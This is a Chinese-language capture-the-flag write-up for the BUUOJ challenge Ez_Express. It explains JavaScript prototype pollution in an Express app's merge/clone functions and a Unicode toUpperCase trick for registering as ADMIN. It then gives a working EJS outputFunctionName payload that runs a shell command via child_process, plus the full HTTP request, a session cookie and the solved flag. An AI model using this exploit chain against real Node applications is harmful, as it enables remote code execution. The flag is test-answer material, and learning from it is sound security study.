# [GYCTF2020]Ez_Express

[题目地址](https://buuoj.cn/challenges#[GYCTF2020]Ez_Express)

原型链污染我来了！

这题的登录注册界面有点奇怪，把账号密码输入后，点注册为注册相应账号，点登陆为登陆账号，竟然不是分开的。扫目录发现了www.zip，里面只有index.js有用。

```js
var express = require('express');
var router = express.Router();
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
//merge和clone，看到这俩玩意就要注意了，有可能有原型链污染
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
const clone = (a) => {
  return merge({}, a);
}
function safeKeyword(keyword) {
  if(keyword.match(/(admin)/is)) {
      return keyword
  }

  return undefined
}

router.get('/', function (req, res) {
  if(!req.session.user){
    res.redirect('/login');
  }
  res.outputFunctionName=undefined;
  res.render('index',data={'user':req.session.user.user});
});


router.get('/login', function (req, res) {
  res.render('login');
});



router.post('/login', function (req, res) {
  if(req.body.Submit=="register"){
    //要求注册时不能注册ADMIN账号
   if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(), //这里转了大写，注意莫名其妙改大小写的地方大概率有问题
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/'); 
  }
  else if(req.body.Submit=="login"){
    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end("<script>alert('error passwd');history.go(-1);</script>")
    }
  
  }
  res.redirect('/'); ;
});
router.post('/action', function (req, res) {
    //前面注册时不能是admin，post访问action时又要admin，这个admin非登陆不可了
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  //clone，原型链污染，我们登陆admin就是为了这个
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
router.get('/info', function (req, res) {
    //注意整个程序提到outputFunctionName的地方只有这里和上面的res.outputFunctionName=undefined; 。所以正常情况下，outputFunctionName都会是undefined，我们获取不到什么东西
  res.render('index',data={'user':res.outputFunctionName});
})
module.exports = router;
```

刚开始的我并不知道什么是原型链污染，看到clone和merge一脸懵逼：哦，所以呢？直到我遇见了[wp](https://www.cnblogs.com/LEOGG321/p/13448463.html)。原来如此。原型链污染一定要看这篇[文章](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)，讲的非常清楚。关键点如下：

1. js的每一个类都有prototype属性，所有类的对象在实例化的时候将会拥有prototype中的属性和方法
2. js的每一个对象又有__proto__属性，指向这个对象所在的类的prototype属性

这里要区分开类和对象的概念。class A，是一个类；a=new A()，a是A的对象。其中，“所有类对象在实例化的时候将会拥有prototype中的属性和方法”这个特性被用来实现JavaScript中的继承机制。假如此时我们有一个对象a，调用其属性——比如b——时，js会顺着继承关系往上找，遵循以下步骤：（个人理解“继承关系”就是原型链）

1. 在对象a中寻找属性b
2. 如果找不到，则在a.__proto__中寻找b
3. 如果仍然找不到，则继续在a.\_\_proto\__.__proto__中寻找b
4. 依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null

不难看出，一个对象所有的属性为自己定义的属性和原型链上所有的属性。回到题目，outputFunctionName属性理论上只能是undefined，但是假如我们往原型链的上层设定一个outputFunctionName属性，这时值就不是undefined了，而是我们设定的东西。

clone函数基本等于merge函数，所以我们重点看merge函数怎么利用就好了。函数的实现很简单，就是把b类的键值对拷贝到A类去。诶？我们在b类里面构造个键值对"\_\_proto\_\_":{xxx}不就能污染对象a的原型链了吗？像下面这样？

```js
let o1 = {}
let o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)
o3 = {}
console.log(o3.b)
```

发现并没有成功污染原型链。原来是`"__proto__": {b: 2}`中的__proto__并不是键值，js直接将它看作o2的原型了，遍历键取不到。解决办法是利用json。

```js
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键，于是成功污染原型链。学习后我们就准备好了，但是想实施攻击需要绕过登陆这一关。根据这篇[文章](https://www.cnblogs.com/20175211lyz/p/12659738.html)里写的js大小写特性，可以发现有如下利用方式：

- 对于toUpperCase():
> 字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
- 对于toLowerCase():
> 字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)

于是我们用admın注册，绕过safeKeyword后借助req.body.userid.toUpperCase()成功注册ADMIN账号。登陆后有个界面问我们最喜欢的语言。随便写点东西提交，抓包发现向action界面post了内容，格式形如`lua=c%23&Submit=`。这个部分无论我们传进什么东西都会根据地`req.session.user.data = clone(req.body);`处理，即传入的内容被放入clone中。这不就给我我们污染原型链的机会了吗？结合程序使用了ejs，参考这篇[文章](https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/)，构造出命令执行漏洞：

- {"lua":"a","\_\_proto\__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"},"Submit":""}

像下面一样发送post即可：

```
POST /action HTTP/1.1
Host: 8a87144e-12ac-42b5-9eb4-2f6c87a710b2.node4.buuoj.cn:81
Content-Length: 158
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://8a87144e-12ac-42b5-9eb4-2f6c87a710b2.node4.buuoj.cn:81
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://8a87144e-12ac-42b5-9eb4-2f6c87a710b2.node4.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: __gads=ID=f00405ef7dd07c2b-22e4cea8d3d90015:T=1673138658:RT=1673138658:S=ALNI_MaIBeJLfEQrPtxHvF5d_RvawAx58A; __gpi=UID=00000926669aa6ee:T=1673138658:RT=1673138658:S=ALNI_MaoW9zXWbCCtVgtccyGDCJIpcPeew; session=s%3AcMMbA-lDzbBOWBxdMM0bssOEZMmN4js8.unkJjbwH7OjYY0L9pKtH%2FM%2Fyoy94u7iHF%2FMFkzOYL6w
Connection: close

{"lua":"a","__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"},"Submit":""}
```

最后去info就能下载到flag了。

## Flag
> flag{14d0c4ac-1b81-4354-a45f-0d637f79b289}